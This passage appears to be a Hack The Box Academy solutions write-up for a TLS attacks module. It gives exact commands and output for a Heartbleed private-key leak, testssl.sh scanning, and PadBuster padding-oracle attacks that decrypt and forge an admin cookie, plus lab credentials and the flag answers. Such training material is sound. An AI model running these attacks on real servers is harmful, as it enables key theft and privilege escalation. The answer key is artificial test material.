┌─[us-academy-2]─[10.10.14.152]─[htb-ac413848@htb-mtjwbdn11t]─[~]
└──╼ [★]$ sudo apt install maven
git clone https://github.com/tls-attacker/TLS-Breaker
cd TLS-Breaker/
mvn clean install -DskipTests=true
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libaopalliance-java libapache-pom-java libatinject-jsr330-api-java libcdi-api-java libcommons-cli-java libcommons-io-java libcommons-lang3-java
  libcommons-parent-java libgeronimo-annotation-1.3-spec-java libgeronimo-interceptor-3.0-spec-java 
<SNIP>
```

Students will verify the installation of `Java` and its directory on the workstation due to the requirement of [TLS-Breaker](https://github.com/tls-attacker/TLS-Breaker/wiki/1.-TLS_Breaker-Configuration) as it expects `JDK 11`, the `java` binary would be located in the subsequent `bin/` directory of `/usr/lib/jvm/java-1.11.0-openjdk-amd64`:

Code: shell

```shell
update-java-alternatives --list
```

```shell
┌─[eu-academy-6]─[10.10.14.74]─[htb-ac-8414@htb-napubisaxw]─[~]
└──╼ [★]$ update-java-alternatives --list

java-1.11.0-openjdk-amd64      1111       /usr/lib/jvm/java-1.11.0-openjdk-amd64
java-1.17.0-openjdk-amd64      1711       /usr/lib/jvm/java-1.17.0-openjdk-amd64
```

Subsequently, students need to exploit `Heartbleed` with `heartbleed-1.0.1.jar` to leak the server's private key, specifying `20` for the `-heartbeats` option; since this attack is non-deterministic, students need to keep retrying it until the private key is leaked. The output of `heartbleed-1.0.1.jar` is piped to `grep` so that only the ten first characters of `d` are displayed, which are `2469793123`:

Code: shell

```shell
/usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -jar apps/heartbleed-1.0.1.jar -connect STMIP:STMPO -executeAttack -heartbeats 20 | grep -Eo "d = [0-9]{1,10}"
```

```shell
┌─[eu-academy-6]─[10.10.14.74]─[htb-ac-8414@htb-napubisaxw]─[~/TLS-Breaker]
└──╼ [★]$ /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -jar apps/heartbleed-1.0.1.jar -connect 94.237.51.88:33652 -executeAttack -heartbeats 20 | grep -Eo "d = [0-9]{1,10}"

d = 2469793123
```

Answer: `2469793123`

# SSL Stripping

## Question 1

### "Look at the HSTS header of the web server. For how long can the site only be accessed via HTTPS?"

Students need to use `cURL` to obtain the headers set by the server, finding that the site can be accessed via HTTPs only for the duration of `63072000` seconds:

Code: shell

```shell
curl -kIs http://STMIP:STMPO | grep -Fi "Strict-Transport-Security:"
```

```shell
┌─[us-academy-2]─[10.10.14.165]─[htb-ac413848@htb-y1uq1oxvul]─[~/TLS-Breaker]
└──╼ [★]$ curl -kIs http://165.227.231.233:32569 | grep -Fi "Strict-Transport-Security:"

Strict-Transport-Security: max-age=63072000;
```

Answer: `63072000`

# Cryptographic Attacks

## Question 1

### "Download the attached file and open the pcap file in Wireshark. Which EXPORT cipher does the client attempt to connect to the server with?"

Students firs need to download [export.zip](https://academy.hackthebox.com/storage/modules/184/export.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/184/export.zip && unzip export.zip
```

```shell
┌─[us-academy-2]─[10.10.14.165]─[htb-ac413848@htb-y1uq1oxvul]─[~/TLS-Breaker]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/184/export.zip && unzip export.zip

--2023-01-17 08:10:37--  https://academy.hackthebox.com/storage/modules/184/export.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1024 (1.0K) [application/zip]
Saving to: ‘export.zip’

export.zip                              100%[=============================================================================>]   1.00K  --.-KB/s    in 0s      

2023-01-17 08:10:37 (12.6 MB/s) - ‘export.zip’ saved [1024/1024]

Archive:  export.zip
  inflating: export.pcap 
```

Once downloaded, students need to inspect "export.pcap" in `Wireshark` and apply the `tls` filter:

Code: shell

```shell
wireshark export.pcap
```

```shell
┌─[us-academy-2]─[10.10.14.165]─[htb-ac413848@htb-y1uq1oxvul]─[~/TLS-Breaker]
└──╼ [★]$ wireshark export.pcap

08:13:41.826     Main Warn QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-htb-ac413848'
```

![[HTB Solutions/CWEE/z. images/7469e0e2abcca742bf18caa09548f806_MD5.jpg]]

When inspecting the `Client Hello` packet, students will find that the `EXPORT` cipher that the client attempts to connect with to the server is `TLS_RSA_EXPORT_WITH_DES40_CBC_SHA`:

![[HTB Solutions/CWEE/z. images/f8f300527b6661212d16b58e8c579262_MD5.jpg]]

Answer: `TLS_RSA_EXPORT_WITH_DES40_CBC_SHA`

# Downgrade Attacks

## Question 1

### "Download the attached file and open the pcap file in Wireshark. Answer the following questions. What TLS version does the client try to negotiate for the session?"

Students first need to download [downgrade.pcap](https://academy.hackthebox.com/storage/modules/184/downgrade.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/184/downgrade.zip && unzip downgrade.zip
```

```shell
┌─[us-academy-2]─[10.10.14.165]─[htb-ac413848@htb-y1uq1oxvul]─[~/TLS-Breaker]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/184/downgrade.zip && unzip downgrade.zip

--2023-01-17 08:40:46--  https://academy.hackthebox.com/storage/modules/184/downgrade.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2497 (2.4K) [application/zip]
Saving to: ‘downgrade.zip’

downgrade.zip                           100%[=============================================================================>]   2.44K  --.-KB/s    in 0s      

2023-01-17 08:40:46 (31.1 MB/s) - ‘downgrade.zip’ saved [2497/2497]

Archive:  downgrade.zip
  inflating: downgrade.pcap
```

Once downloaded, students need to inspect "downgrade.pcap" with `Wireshark` and apply the `tls` filter:

Code: shell

```shell
wireshark downgrade.pcap
```

```shell
┌─[us-academy-2]─[10.10.14.165]─[htb-ac413848@htb-y1uq1oxvul]─[~/TLS-Breaker]
└──╼ [★]$ wireshark downgrade.pcap

08:42:24.346     Main Warn QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-htb-ac413848'
```

![[HTB Solutions/CWEE/z. images/e4cc67dfd76cd8057d280524fb6841b2_MD5.jpg]]

Inspecting the `Client Hello` packet, students will find out that the client version is `TLS 1.2`:

![[HTB Solutions/CWEE/z. images/acd91113b7001ffdcb86f4bb5645a855_MD5.jpg]]

Answer: `TLS 1.2`

# Downgrade Attacks

## Question 2

### "What version do the client and server end up using for the session?"

Using the same `Wireshark` window, students need to inspect the `Server Hello` packet to find out that version the client and server ended up using for the session is `SSL 3.0`:

![[HTB Solutions/CWEE/z. images/14d3b5d0b702d851eb71c910968f18c0_MD5.jpg]]

Answer: `SSL 3.0`

# Testing TLS Configuration

## Question 1

### "Run testssl.sh against the web server and answer the following questions. Which grade is given by testssl?"

First, students need to clone [testssl](https://github.com/drwetter/testssl.sh):

Code: shell

```shell
git clone --depth 1 https://github.com/drwetter/testssl.sh.git
cd testssl.sh/
```

```shell
┌─[us-academy-2]─[10.10.14.165]─[htb-ac413848@htb-y1uq1oxvul]─[~]
└──╼ [★]$ git clone --depth 1 https://github.com/drwetter/testssl.sh.git
cd testssl.sh/

Cloning into 'testssl.sh'...
remote: Enumerating objects: 104, done.
remote: Counting objects: 100% (104/104), done.
remote: Compressing objects: 100% (97/97), done.
remote: Total 104 (delta 15), reused 33 (delta 6), pack-reused 0
Receiving objects: 100% (104/104), 8.68 MiB | 4.36 MiB/s, done.
Resolving deltas: 100% (15/15), done.
```

Subsequently, students need to run `testssl.sh` on the spawned target machine (answering `yes` when prompted with "The results might look ok but they could be nonsense. Really proceed ? ("yes" to continue) -->"), finding that the grade given by `testssl` is `T`:

Code: shell

```shell
bash testssl.sh STMIP:STMPO
```

```shell
<SNIP>

 Rating (experimental) 

 Rating specs (not complete)  SSL Labs's 'SSL Server Rating Guide' (version 2009q from 2020-01-30)
 Specification documentation  https://github.com/ssllabs/research/wiki/SSL-Server-Rating-Guide
 Protocol Support (weighted)  0 (0)
 Key Exchange     (weighted)  0 (0)
 Cipher Strength  (weighted)  0 (0)
 Final Score                  0
 Overall Grade                T
 <SNIP>
```

Answer: `T`

# Testing TLS Configuration

## Question 2

### "How many cipher suites are supported for TLS 1.2?"

From the output of `testssl` in the previous question, students will know that `2` cipher suites are supported for `TLS 1.2`:

```shell
<SNIP>

Handshake error!Hexcode  Cipher Suite Name (OpenSSL)       KeyExch.   Encryption  Bits     Cipher Suite Name (IANA/RFC)
-----------------------------------------------------------------------------------------------------------------------------
SSLv2
 - 
SSLv3 (server order)
 x15     EDH-RSA-DES-CBC-SHA               DH 2048    DES         56       TLS_DHE_RSA_WITH_DES_CBC_SHA                       
 x09     DES-CBC-SHA                       RSA        DES         56       TLS_RSA_WITH_DES_CBC_SHA                           
TLSv1 (server order)
 x15     EDH-RSA-DES-CBC-SHA               DH 2048    DES         56       TLS_DHE_RSA_WITH_DES_CBC_SHA                       
 x09     DES-CBC-SHA                       RSA        DES         56       TLS_RSA_WITH_DES_CBC_SHA                           
TLSv1.1 (server order)
 x15     EDH-RSA-DES-CBC-SHA               DH 2048    DES         56       TLS_DHE_RSA_WITH_DES_CBC_SHA                       
 x09     DES-CBC-SHA                       RSA        DES         56       TLS_RSA_WITH_DES_CBC_SHA                           
TLSv1.2 (server order)
 x15     EDH-RSA-DES-CBC-SHA               DH 2048    DES         56       TLS_DHE_RSA_WITH_DES_CBC_SHA                       
 x09     DES-CBC-SHA                       RSA        DES         56       TLS_RSA_WITH_DES_CBC_SHA                           
TLSv1.3
 - 

<SNIP>
```

Answer: `2`

# Testing TLS Configuration

## Question 3

### "Which OpenSSL Bug is the server vulnerable to?"

From the output of `testssl` in the first question, students will know that the `OpenSSL` bug the server is vulnerable to is `HeartBleed`:

```shell
 <SNIP>
 
 Testing vulnerabilities 

 Heartbleed (CVE-2014-0160)                VULNERABLE (NOT ok)
 CCS (CVE-2014-0224)                       VULNERABLE (NOT ok)
 Ticketbleed (CVE-2016-9244), experiment.  (applicable only for HTTPS)
 
<SNIP>
```

Answer: `HeartBleed`

# Skills Assessment

## Question 1

### "Exploit the vulnerable web application and submit the flag."

After spawning the target machine, students need to visit its root webpage and login with the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/8f69acff4da1d44804b854be8339ee1d_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/2c5e02817117a28c87bbbc2eb25112f3_MD5.jpg]]

Afterward, students need to visit the `/admin` page by clicking on "Admin Area", intercept the request with `Burp Suite` and send it to `Repeater`, to notice that the "user" cookie is lower-case hex encoded (this is important to note later when using `PadBuster`):

![[HTB Solutions/CWEE/z. images/749425b1ea4df571a277003345a1024c_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/557894b3c35576c708cc14a8e909dff1_MD5.jpg]]

When altering the cookie's value (to something such as "invalid"), students will notice that the response returns "Decryption failed":

![[HTB Solutions/CWEE/z. images/ac5412884d9f49b260a56ac164200af6_MD5.jpg]]

From the error message returned, students need to use `PadBuster` on the Padding Oracle at the `/admin` endpoint to decrypt the cookie; the block size needs to be set to 16, the encoding to lowercase hexadecimal (i.e., `1` in `PadBuster`), and the error message to "Decryption failed". The decrypted value of the "user" cookie is `{"user": "htb-stdnt", "role": "user"}`:

```shell
padbuster http://STMIP:STMPO/admin "963882e67113e76587b1e0c129ab8485e072a5f7af71c8c7858473b917772acd212fedc54303f1efd41da3ca27360cddc699851cdb81466afaf6f7d112d964ed" 16 -encoding 1 -cookies "user=963882e67113e76587b1e0c129ab8485e072a5f7af71c8c7858473b917772acd212fedc54303f1efd41da3ca27360cddc699851cdb81466afaf6f7d112d964ed" -error "Decryption failed"
```
```shell
┌─[us-academy-2]─[10.10.14.229]─[htb-ac413848@htb-u7mr54zueo]─[~]
└──╼ [★]$ padbuster http://161.35.162.53:31128/admin "963882e67113e76587b1e0c129ab8485e072a5f7af71c8c7858473b917772acd212fedc54303f1efd41da3ca27360cddc699851cdb81466afaf6f7d112d964ed" 16 -encoding 1 -cookies "user=963882e67113e76587b1e0c129ab8485e072a5f7af71c8c7858473b917772acd212fedc54303f1efd41da3ca27360cddc699851cdb81466afaf6f7d112d964ed" -error "Decryption failed"

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 401
[+] Location: N/A
[+] Content Length: 17

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 3 ***

[+] Success: (16/256) [Byte 16]
[+] Success: (11/256) [Byte 15]
[+] Success: (123/256) [Byte 14]
[+] Success: (177/256) [Byte 13]
[+] Success: (80/256) [Byte 12]
[+] Success: (114/256) [Byte 11]
[+] Success: (108/256) [Byte 10]
[+] Success: (81/256) [Byte 9]
[+] Success: (170/256) [Byte 8]
[+] Success: (49/256) [Byte 7]
[+] Success: (150/256) [Byte 6]
[+] Success: (232/256) [Byte 5]
[+] Success: (104/256) [Byte 4]
[+] Success: (7/256) [Byte 3]
[+] Success: (235/256) [Byte 2]
[+] Success: (3/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): e072a5f7af71c8c7858473b917772acd
[+] Intermediate Bytes (HEX): ed1af7951461c55fa79388b54b86f7f1
[+] Plain Text: {"user": "htb-st

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361.
*** Starting Block 2 of 3 ***

[+] Success: (71/256) [Byte 16]
[+] Success: (246/256) [Byte 15]
[+] Success: (172/256) [Byte 14]
[+] Success: (215/256) [Byte 13]
[+] Success: (98/256) [Byte 12]
[+] Success: (240/256) [Byte 11]
[+] Success: (17/256) [Byte 10]
[+] Success: (30/256) [Byte 9]
[+] Success: (68/256) [Byte 8]
[+] Success: (32/256) [Byte 7]
[+] Success: (166/256) [Byte 6]
[+] Success: (113/256) [Byte 5]
[+] Success: (40/256) [Byte 4]
[+] Success: (33/256) [Byte 3]
[+] Success: (237/256) [Byte 2]
[+] Success: (108/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): 212fedc54303f1efd41da3ca27360cdd
[+] Intermediate Bytes (HEX): 841cd1d58351eab5eae8169b2d5708b8
[+] Plain Text: dnt", "role": "u

*** Starting Block 3 of 3 ***

[+] Success: (41/256) [Byte 16]
[+] Success: (251/256) [Byte 15]
[+] Success: (194/256) [Byte 14]
[+] Success: (216/256) [Byte 13]
[+] Success: (60/256) [Byte 12]
[+] Success: (82/256) [Byte 11]
[+] Success: (239/256) [Byte 10]
[+] Success: (41/256) [Byte 9]
[+] Success: (19/256) [Byte 8]
[+] Success: (16/256) [Byte 7]
[+] Success: (253/256) [Byte 6]
[+] Success: (206/256) [Byte 5]
[+] Success: (22/256) [Byte 4]
[+] Success: (111/256) [Byte 3]
[+] Success: (187/256) [Byte 2]
[+] Success: (190/256) [Byte 1]

Block 3 Results:
[+] Cipher Text (HEX): c699851cdb81466afaf6f7d112d964ed
[+] Intermediate Bytes (HEX): 524a9fe73e08fae4df16a8c12c3d07d6
[+] Plain Text: ser"}

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): {"user": "htb-stdnt", "role": "user"}

[+] Decrypted value (HEX): 7B2275736572223A20226874622D7374646E74222C2022726F6C65223A202275736572227D0B0B0B0B0B0B0B0B0B0B0B

[+] Decrypted value (Base64): eyJ1c2VyIjogImh0Yi1zdGRudCIsICJyb2xlIjogInVzZXIifQsLCwsLCwsLCwsL

-------------------------------------------------------
```

Subsequently, students need to encrypt the cookie with the value `{"user": "admin", "role": "admin"}` to attempt to escalate privileges, attaining the encrypted cookie value `e229d8a9e42697ab26f61c38e00db5ae5f1cd90fdb85f20f81a48623746e914d3d2bdd97415095b66b720e552e81fedd00000000000000000000000000000000`:

```shell
padbuster http://STMIP:STMPO/admin "963882e67113e76587b1e0c129ab8485e072a5f7af71c8c7858473b917772acd212fedc54303f1efd41da3ca27360cddc699851cdb81466afaf6f7d112d964ed" 16 -encoding 1 -cookies "user=963882e67113e76587b1e0c129ab8485e072a5f7af71c8c7858473b917772acd212fedc54303f1efd41da3ca27360cddc699851cdb81466afaf6f7d112d964ed" -error "Decryption failed" -plaintext '{"user": "admin", "role": "admin"}'
```
```shell
┌─[us-academy-2]─[10.10.14.229]─[htb-ac413848@htb-u7mr54zueo]─[~]
└──╼ [★]$ padbuster http://161.35.162.53:31128/admin "963882e67113e76587b1e0c129ab8485e072a5f7af71c8c7858473b917772acd212fedc54303f1efd41da3ca27360cddc699851cdb81466afaf6f7d112d964ed" 16 -encoding 1 -cookies "user=963882e67113e76587b1e0c129ab8485e072a5f7af71c8c7858473b917772acd212fedc54303f1efd41da3ca27360cddc699851cdb81466afaf6f7d112d964ed" -error "Decryption failed" -plaintext '{"user": "admin", "role": "admin"}'

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 401
[+] Location: N/A
[+] Content Length: 17

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 3

[+] Success: (46/256) [Byte 16]
[+] Success: (14/256) [Byte 15]
[+] Success: (116/256) [Byte 14]
[+] Success: (220/256) [Byte 13]
[+] Success: (162/256) [Byte 12]
[+] Success: (250/256) [Byte 11]
[+] Success: (133/256) [Byte 10]
[+] Success: (147/256) [Byte 9]
[+] Success: (79/256) [Byte 8]
[+] Success: (111/256) [Byte 7]
[+] Success: (171/256) [Byte 6]
[+] Success: (189/256) [Byte 5]
[+] Success: (108/256) [Byte 4]
[+] Success: (35/256) [Byte 3]
[+] Success: (167/256) [Byte 2]
[+] Success: (241/256) [Byte 1]

Block 3 Results:
[+] New Cipher Text (HEX): 3d2bdd97415095b66b720e552e81fedd
[+] Intermediate Bytes (HEX): 1f56d3994f5e9bb8657c005b208ff0d3

[+] Success: (222/256) [Byte 16]
[+] Success: (6/256) [Byte 15]
[+] Success: (256/256) [Byte 14]
[+] Success: (236/256) [Byte 13]
[+] Success: (185/256) [Byte 12]
[+] Success: (94/256) [Byte 11]
[+] Success: (125/256) [Byte 10]
[+] Success: (77/256) [Byte 9]
[+] Success: (220/256) [Byte 8]
[+] Success: (99/256) [Byte 7]
[+] Success: (30/256) [Byte 6]
[+] Success: (72/256) [Byte 5]
[+] Success: (144/256) [Byte 4]
[+] Success: (11/256) [Byte 3]
[+] Success: (205/256) [Byte 2]
[+] Success: (157/256) [Byte 1]

Block 2 Results:
[+] New Cipher Text (HEX): 5f1cd90fdb85f20f81a48623746e914d
[+] Intermediate Bytes (HEX): 733cfb7db4e9972dbb84a4421003f823

[+] Success: (115/256) [Byte 16]
[+] Success: (39/256) [Byte 15]
[+] Success: (153/256) [Byte 14]
[+] Success: (119/256) [Byte 13]
[+] Success: (167/256) [Byte 12]
[+] Success: (133/256) [Byte 11]
[+] Success: (45/256) [Byte 10]
q[+] Success: (242/256) [Byte 9]
[+] Success: (104/256) [Byte 8]
[+] Success: (65/256) [Byte 7]
[+] Success: (161/256) [Byte 6]
[+] Success: (115/256) [Byte 5]
[+] Success: (41/256) [Byte 4]
[+] Success: (93/256) [Byte 3]
[+] Success: (252/256) [Byte 2]
[+] Success: (119/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): e229d8a9e42697ab26f61c38e00db5ae
[+] Intermediate Bytes (HEX): 990badda8154b59106d47d5c8d64db8c

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: e229d8a9e42697ab26f61c38e00db5ae5f1cd90fdb85f20f81a48623746e914d3d2bdd97415095b66b720e552e81fedd00000000000000000000000000000000
-------------------------------------------------------
```

Students need to use the encrypted cookie in the `/admin` endpoint, attaining the token `0e0d74356da663454101d805584b6190eb57e7e30d9817ecfbf7973c9ab5df54f46a586de5c8693203896946088172a3` on line 342 of the response:

![[HTB Solutions/CWEE/z. images/6358fa8e1d2c51de1738692a837bd580_MD5.jpg]]

Afterward, students need to go to `/token` by clicking on "Redeem Token":

![[HTB Solutions/CWEE/z. images/3d30b5168aa6c2614310f2deed1f1944_MD5.jpg]]

Then, students need to supply the token previously attained, making sure that `Burp Suite` is intercepting the request to send it to `Repeater`:

![[HTB Solutions/CWEE/z. images/c5a0e593b63f48250e12f498241be5c4_MD5.jpg]]

When not altering the "token" POST parameter being sent in the request, students will receive a normal, albeit useless, response message on line 356:

![[HTB Solutions/CWEE/z. images/abe0a8a2f3793e010bb8ab0a24b28ebe_MD5.jpg]]

However, same as previously done, when fed an incorrect/invalid value, the response returns an error message stating "Decryption Error. Invalid Token!" on line 356:

![[HTB Solutions/CWEE/z. images/d2f5112a82839e217d94bd3afdba0ded_MD5.jpg]]

Thus, students need to once again use `PadBuster` to decrypt the token value, however unlike previously, the block size needs to be set to 8 along with using the `-post` option (since it is a `POST` request), attaining the flag `HTB{f0b8ed15026e95ce5b4dbcacab0dbc3d}`:

```shell
padbuster http://STMIP:STMPO/token "0e0d74356da663454101d805584b6190eb57e7e30d9817ecfbf7973c9ab5df54f46a586de5c8693203896946088172a3" 8 -encoding 1 -post "token=0e0d74356da663454101d805584b6190eb57e7e30d9817ecfbf7973c9ab5df54f46a586de5c8693203896946088172a3" -error "Decryption Error. Invalid Token!"
```
```shell
┌─[us-academy-2]─[10.10.14.242]─[htb-ac413848@htb-x1dh7idlsl]─[~]
└──╼ [★]$ padbuster http://142.93.38.9:30991/token "0e0d74356da663454101d805584b6190eb57e7e30d9817ecfbf7973c9ab5df54f46a586de5c8693203896946088172a3" 8 -encoding 1 -post "token=0e0d74356da663454101d805584b6190eb57e7e30d9817ecfbf7973c9ab5df54f46a586de5c8693203896946088172a3" -error "Decryption Error. Invalid Token!" 

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 17567

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 5 ***

[+] Success: (132/256) [Byte 8]
[+] Success: (253/256) [Byte 7]
[+] Success: (107/256) [Byte 6]
[+] Success: (241/256) [Byte 5]
[+] Success: (181/256) [Byte 4]
[+] Success: (208/256) [Byte 3]
[+] Success: (162/256) [Byte 2]
[+] Success: (178/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 4101d805584b6190
[+] Intermediate Bytes (HEX): 4659364e0b96017d
[+] Plain Text: HTB{f0b8

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361.
*** Starting Block 2 of 5 ***

[+] Success: (12/256) [Byte 8]
[+] Success: (171/256) [Byte 7]
[+] Success: (134/256) [Byte 6]
[+] Success: (148/256) [Byte 5]
[+] Success: (203/256) [Byte 4]
[+] Success: (17/256) [Byte 3]
[+] Success: (158/256) [Byte 2]
[+] Success: (212/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): eb57e7e30d9817ec
[+] Intermediate Bytes (HEX): 2465e930687957f5
[+] Plain Text: ed15026e

*** Starting Block 3 of 5 ***

[+] Success: (119/256) [Byte 8]
[+] Success: (223/256) [Byte 7]
[+] Success: (7/256) [Byte 6]
[+] Success: (196/256) [Byte 5]
[+] Success: (125/256) [Byte 4]
[+] Success: (126/256) [Byte 3]
[+] Success: (155/256) [Byte 2]
[+] Success: (38/256) [Byte 1]

Block 3 Results:
[+] Cipher Text (HEX): fbf7973c9ab5df54
[+] Intermediate Bytes (HEX): d262848638fa2388
[+] Plain Text: 95ce5b4d

*** Starting Block 4 of 5 ***

[+] Success: (207/256) [Byte 8]
[+] Success: (19/256) [Byte 7]
[+] Success: (44/256) [Byte 6]
[+] Success: (1/256) [Byte 5]
[+] Success: (166/256) [Byte 4]
[+] Success: (16/256) [Byte 3]
[+] Success: (109/256) [Byte 2]
[+] Success: (111/256) [Byte 1]

Block 4 Results:
[+] Cipher Text (HEX): f46a586de5c86932
[+] Intermediate Bytes (HEX): 9994f65ffbd7ef30
[+] Plain Text: bcacab0d

*** Starting Block 5 of 5 ***

[+] Success: (208/256) [Byte 8]
[+] Success: (152/256) [Byte 7]
[+] Success: (56/256) [Byte 6]
[+] Success: (100/256) [Byte 5]
[+] Success: (244/256) [Byte 4]
[+] Success: (147/256) [Byte 3]
[+] Success: (242/256) [Byte 2]
[+] Success: (98/256) [Byte 1]

Block 5 Results:
[+] Cipher Text (HEX): 03896946088172a3
[+] Intermediate Bytes (HEX): 96096b0998cb6a31
[+] Plain Text: bc3d}

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): HTB{f0b8ed15026e95ce5b4dbcacab0dbc3d}

[+] Decrypted value (HEX): 4854427B66306238656431353032366539356365356234646263616361623064626333647D030303

[+] Decrypted value (Base64): SFRCe2YwYjhlZDE1MDI2ZTk1Y2U1YjRkYmNhY2FiMGRiYzNkfQMDAw==

-------------------------------------------------------
```

Answer: `HTB{f0b8ed15026e95ce5b4dbcacab0dbc3d}`